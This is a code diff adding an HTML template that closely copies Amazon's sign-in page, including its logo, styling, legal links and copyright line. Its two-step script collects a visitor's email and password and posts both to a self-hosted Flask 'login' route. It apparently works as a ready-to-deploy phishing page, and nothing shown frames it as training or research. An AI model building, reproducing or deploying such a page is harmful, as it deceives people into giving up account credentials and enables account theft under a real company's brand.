@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Sign-In</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: "Amazon Ember", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #0f1111;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            min-height: 100vh;
+            padding: 14px 18px 28px;
+        }
+
+        /* Container */
+        .page-container {
+            width: 100%;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Amazon Logo Header */
+        .logo-container {
+            margin-bottom: 18px;
+            margin-top: 6px;
+        }
+
+        .amazon-logo {
+            width: 103px;
+            height: 31px;
+        }
+
+        /* Auth Card */
+        .auth-card {
+            background-color: #ffffff;
+            width: 100%;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 20px 26px 26px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.02);
+        }
+
+        .title {
+            font-size: 28px;
+            font-weight: 400;
+            color: #0f1111;
+            margin-bottom: 14px;
+            line-height: 1.2;
+        }
+
+        /* Views Switching */
+        .view {
+            display: none;
+            width: 100%;
+            flex-direction: column;
+        }
+
+        .view.active {
+            display: flex;
+        }
+
+        /* User Badge for Step 2 */
+        .user-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            color: #0f1111;
+            margin-bottom: 16px;
+        }
+
+        .change-link {
+            color: #007185;
+            text-decoration: none;
+            font-size: 13px;
+            cursor: pointer;
+        }
+
+        .change-link:hover {
+            color: #c45500;
+            text-decoration: underline;
+        }
+
+        /* Forms & Inputs */
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-bottom: 14px;
+            position: relative;
+        }
+
+        .form-label {
+            font-size: 13px;
+            font-weight: 700;
+            color: #0f1111;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 31px;
+            padding: 3px 7px;
+            background-color: #ffffff;
+            border: 1px solid #888c8c;
+            border-radius: 3px;
+            font-size: 13px;
+            outline: none;
+            color: #0f1111;
+            box-shadow: 0 1px 2px rgba(15, 17, 17, 0.15) inset;
+            transition: border-color 0.15s, box-shadow 0.15s;
+        }
+
+        .input-field:focus {
+            border-color: #e77600;
+            box-shadow: 0 0 3px 2px rgba(228, 121, 17, 0.5);
+        }
+
+        .eye-btn {
+            position: absolute;
+            right: 8px;
+            top: 25px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #565959;
+            display: flex;
+            align-items: center;
+        }
+
+        /* Buttons */
+        .btn-primary {
+            width: 100%;
+            height: 31px;
+            background: #ffd814;
+            border: 1px solid #fcd200;
+            border-radius: 8px;
+            color: #0f1111;
+            font-size: 13px;
+            cursor: pointer;
+            box-shadow: 0 2px 5px 0 rgba(213,217,217,.5);
+            transition: background-color 0.15s, border-color 0.15s;
+        }
+
+        .btn-primary:hover {
+            background: #f7ca00;
+            border-color: #f2c200;
+        }
+
+        .btn-primary:active {
+            background: #f0b800;
+            border-color: #008296;
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.15);
+        }
+
+        /* Legal Text */
+        .legal-text {
+            font-size: 12px;
+            line-height: 1.5;
+            color: #0f1111;
+            margin-top: 18px;
+        }
+
+        .legal-text a {
+            color: #007185;
+            text-decoration: none;
+        }
+
+        .legal-text a:hover {
+            color: #c45500;
+            text-decoration: underline;
+        }
+
+        /* Accordion / Help Section */
+        .help-link {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            font-size: 13px;
+            color: #007185;
+            text-decoration: none;
+            margin-top: 18px;
+            cursor: pointer;
+        }
+
+        .help-link:hover {
+            color: #c45500;
+            text-decoration: underline;
+        }
+
+        .help-arrow {
+            width: 0;
+            height: 0;
+            border-left: 4px solid #555;
+            border-top: 4px solid transparent;
+            border-bottom: 4px solid transparent;
+            transition: transform 0.15s ease;
+        }
+
+        .help-arrow.expanded {
+            transform: rotate(90deg);
+        }
+
+        .help-details {
+            display: none;
+            flex-direction: column;
+            gap: 6px;
+            margin-top: 8px;
+            padding-left: 12px;
+            font-size: 13px;
+        }
+
+        .help-details.active {
+            display: flex;
+        }
+
+        .help-details a {
+            color: #007185;
+            text-decoration: none;
+        }
+
+        .help-details a:hover {
+            color: #c45500;
+            text-decoration: underline;
+        }
+
+        .forgot-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        /* Divider & Create Account */
+        .divider {
+            position: relative;
+            text-align: center;
+            margin: 22px 0 14px;
+        }
+
+        .divider::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background-color: #e7e7e7;
+            z-index: 1;
+        }
+
+        .divider-text {
+            position: relative;
+            z-index: 2;
+            background-color: #ffffff;
+            padding: 0 8px;
+            font-size: 12px;
+            color: #767676;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            height: 31px;
+            background: #ffffff;
+            border: 1px solid #d5d9d9;
+            border-radius: 8px;
+            color: #0f1111;
+            font-size: 13px;
+            cursor: pointer;
+            box-shadow: 0 2px 5px 0 rgba(213, 217, 217, 0.5);
+            transition: background-color 0.15s, border-color 0.15s;
+            text-align: center;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn-secondary:hover {
+            background-color: #f7f9fa;
+            border-color: #d5d9d9;
+        }
+
+        /* Footer Links */
+        .footer-divider {
+            width: 100%;
+            height: 1px;
+            background: linear-gradient(to right, rgba(0,0,0,0), rgba(0,0,0,0.1), rgba(0,0,0,0));
+            margin-top: 26px;
+            margin-bottom: 26px;
+        }
+
+        .footer {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            width: 100%;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 20px;
+            font-size: 11px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .footer-links a {
+            color: #007185;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            color: #c45500;
+            text-decoration: underline;
+        }
+
+        .copyright {
+            font-size: 11px;
+            color: #555555;
+            text-align: center;
+        }
+
+        /* hidden field */
+        .hidden-field {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="page-container">
+        <!-- Official Amazon Logo SVG -->
+        <div class="logo-container">
+            <svg class="amazon-logo" viewBox="0 0 103 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M60.2 26.5C53.3 31.6 42.1 34.3 33.6 34.3C21.7 34.3 11.2 29.8 1.4 22.1C0.7 21.5 1.2 20.6 2.1 21.1C13.2 27.5 23.3 30.7 33.9 30.7 C41.6 30.7 51.7 28.3 59.3 23.7C60.4 23 61.2 25.7 60.2 26.5Z" fill="#FF9900"/>
+                <path d="M62.6 23.8C62.2 23.3 59.7 23.8 58.4 24C58.1 24 58 23.7 58.3 23.5C60.2 22.2 63.4 22.3 63.7 22.7C64 23.1 63.2 26.3 61.4 27.8C61.1 28 60.9 27.8 61 27.6C61.4 26.3 62.9 24.3 62.6 23.8Z" fill="#FF9900"/>
+                <path d="M38 17.5V10.1C38 8.8 38.1 7.7 37.3 6.7C36.6 5.8 35.4 5.5 34.3 5.5C31.8 5.5 29.8 7 29.3 9.4C29.2 9.9 29.7 10.2 30.1 10.2L32.4 10C32.8 10 33 9.7 33.1 9.3C33.4 8.2 34 7.6 35 7.6C35.5 7.6 36 7.9 36 8.5V9.4C33.1 9.6 29 10.8 29 14.5C29 16.6 30.4 18.2 32.5 18.2C34.2 18.2 35.6 17.3 36.3 16C36.6 16.7 36.8 17.2 37 17.5C37.2 17.8 37.5 18 37.8 18H39.8C40.1 18 40.3 17.7 40.2 17.4L38 17.5ZM36 13.6C35.6 14.7 34.5 15.6 33.3 15.6C32.4 15.6 31.8 15 31.8 14C31.8 12.3 33.6 11.7 36 11.5V13.6Z" fill="#111111"/>
+                <path d="M48.8 8.1C47.7 7.2 46.2 6.8 44.7 6.8C42.2 6.8 40.3 8.2 39.8 10.6C39.7 11.1 40.2 11.4 40.6 11.4L42.9 11.2C43.3 11.2 43.5 10.9 43.6 10.5C43.9 9.4 44.5 8.8 45.5 8.8C46 8.8 46.5 9.1 46.5 9.7V10.6C43.6 10.8 39.5 12 39.5 15.7C39.5 17.8 40.9 19.4 43 19.4C44.7 19.4 46.1 18.5 46.8 17.2V17.6C46.8 18.1 47.1 18.4 47.6 18.4H49.6C50 18.4 50.2 18.1 50.2 17.7V12.1C50.2 9.8 49.7 8.8 48.8 8.1ZM46.5 14.8C46.1 15.9 45 16.8 43.8 16.8C42.9 16.8 42.3 16.2 42.3 15.2C42.3 13.5 44.1 12.9 46.5 12.7V14.8Z" fill="#111111"/>
+                <path d="M27.2 6.9H24.8C24.4 6.9 24.1 7.1 24.1 7.5V8.1C23.4 7.2 22.1 6.8 20.8 6.8C17.7 6.8 15.5 9.3 15.5 12.6C15.5 16 17.8 18.4 20.9 18.4C22.2 18.4 23.4 17.9 24.2 17.1V17.7C24.2 18.1 24.5 18.4 24.9 18.4H27.3C27.6 18.4 27.9 18.1 27.9 17.7V7.6C27.8 7.2 27.5 6.9 27.2 6.9ZM21.7 16.2C19.7 16.2 18.3 14.7 18.3 12.6C18.3 10.5 19.7 9 21.7 9C23.7 9 25.1 10.5 25.1 12.6C25.1 14.7 23.7 16.2 21.7 16.2Z" fill="#111111"/>
+                <path d="M52.3 18.1H54.7C55.1 18.1 55.4 17.8 55.4 17.4V11.8C55.4 10.5 56.1 9.4 57.3 9.4C58.2 9.4 58.7 10.1 58.7 11.2V17.4C58.7 17.8 59 18.1 59.4 18.1H61.8C62.2 18.1 62.5 17.8 62.5 17.4V10.8C62.5 8.2 61 6.8 58.8 6.8C57.3 6.8 56.1 7.5 55.3 8.6V7.6C55.3 7.2 55 6.9 54.6 6.9H52.3C51.9 6.9 51.6 7.2 51.6 7.6V17.3C51.6 17.8 51.9 18.1 52.3 18.1Z" fill="#111111"/>
+                <path d="M72.2 6.8C68.8 6.8 66.5 9.3 66.5 12.6C66.5 16 68.8 18.4 72.2 18.4C75.6 18.4 77.9 16 77.9 12.6C77.9 9.3 75.6 6.8 72.2 6.8ZM72.2 16.2C70.1 16.2 69.3 14.5 69.3 12.6C69.3 10.7 70.1 9 72.2 9C74.3 9 75.1 10.7 75.1 12.6C75.1 14.5 74.3 16.2 72.2 16.2Z" fill="#111111"/>
+            </svg>
+        </div>
+
+        <!-- Auth Main Card -->
+        <main class="auth-card">
+            <h1 class="title">Sign in</h1>
+
+            <!-- STEP 1: Email / Mobile -->
+            <div id="step-email" class="view active">
+                <form id="email-form">
+                    <div class="form-group">
+                        <label for="email-input" class="form-label">Email or mobile phone number</label>
+                        <input type="text" id="email-input" class="input-field" required autofocus />
+                    </div>
+
+                    <button type="submit" class="btn-primary">Continue</button>
+                </form>
+
+                <p class="legal-text">
+                    By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
+                </p>
+
+                <div class="help-link" id="help-toggle">
+                    <span class="help-arrow" id="help-arrow"></span>
+                    <span>Need help?</span>
+                </div>
+
+                <div class="help-details" id="help-details">
+                    <a href="#">Forgot your password?</a>
+                    <a href="#">Other issues with Sign-In</a>
+                </div>
+            </div>
+
+            <!-- STEP 2: Password -->
+            <div id="step-password" class="view">
+                <div class="user-badge">
+                    <span id="display-email">user@example.com</span>
+                    <a class="change-link" id="btn-change-email">Change</a>
+                </div>
+
+                <!-- PASSWORD FORM: posts email as username, password as password to Flask -->
+                <form id="password-form" action="{{ url_for('login') }}" method="POST">
+                    <!-- Hidden field for email (username) -->
+                    <input type="hidden" name="username" id="hidden-email" value="">
+
+                    <div class="form-group">
+                        <div class="forgot-row">
+                            <label for="password-input" class="form-label">Password</label>
+                            <a href="#" class="change-link" style="font-size: 12px;">Forgot password?</a>
+                        </div>
+                        <input type="password" id="password-input" name="password" class="input-field" required />
+                        <button type="button" class="eye-btn" id="toggle-pwd" aria-label="Toggle password visibility">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                <circle cx="12" cy="12" r="3"></circle>
+                            </svg>
+                        </button>
+                    </div>
+
+                    <button type="submit" class="btn-primary">Sign in</button>
+                </form>
+
+                <p class="legal-text">
+                    By signing in, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
+                </p>
+            </div>
+        </main>
+
+        <!-- Create Account Section (Only visible on Step 1) -->
+        <div id="create-account-section" style="width: 100%;">
+            <div class="divider">
+                <span class="divider-text">New to Amazon?</span>
+            </div>
+
+            <a href="#" class="btn-secondary">Create your Amazon account</a>
+        </div>
+    </div>
+
+    <!-- Footer Links -->
+    <div style="width: 100%; max-width: 350px;">
+        <div class="footer-divider"></div>
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#">Conditions of Use</a>
+                <a href="#">Privacy Notice</a>
+                <a href="#">Help</a>
+            </div>
+            <p class="copyright">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        </footer>
+    </div>
+
+    <script>
+        const emailForm = document.getElementById('email-form');
+        const emailInput = document.getElementById('email-input');
+        const displayEmail = document.getElementById('display-email');
+        
+        const stepEmail = document.getElementById('step-email');
+        const stepPassword = document.getElementById('step-password');
+        const btnChangeEmail = document.getElementById('btn-change-email');
+        const passwordInput = document.getElementById('password-input');
+        const togglePwd = document.getElementById('toggle-pwd');
+        
+        const helpToggle = document.getElementById('help-toggle');
+        const helpArrow = document.getElementById('help-arrow');
+        const helpDetails = document.getElementById('help-details');
+        const createAccountSection = document.getElementById('create-account-section');
+        const hiddenEmail = document.getElementById('hidden-email');
+
+        // Transition Step 1 -> Step 2
+        emailForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const val = emailInput.value.trim();
+            if (val) {
+                displayEmail.textContent = val;
+                hiddenEmail.value = val;   // set hidden field for submission
+                stepEmail.classList.remove('active');
+                stepPassword.classList.add('active');
+                createAccountSection.style.display = 'none';
+                passwordInput.focus();
+            }
+        });
+
+        // Change Email (Return to Step 1)
+        btnChangeEmail.addEventListener('click', () => {
+            stepPassword.classList.remove('active');
+            stepEmail.classList.add('active');
+            createAccountSection.style.display = 'block';
+            emailInput.focus();
+        });
+
+        // Help Accordion Toggle
+        helpToggle.addEventListener('click', () => {
+            helpArrow.classList.toggle('expanded');
+            helpDetails.classList.toggle('active');
+        });
+
+        // Toggle Password Visibility
+        togglePwd.addEventListener('click', () => {
+            const isPassword = passwordInput.getAttribute('type') === 'password';
+            passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
+        });
+    </script>
+
+</body>
+</html>
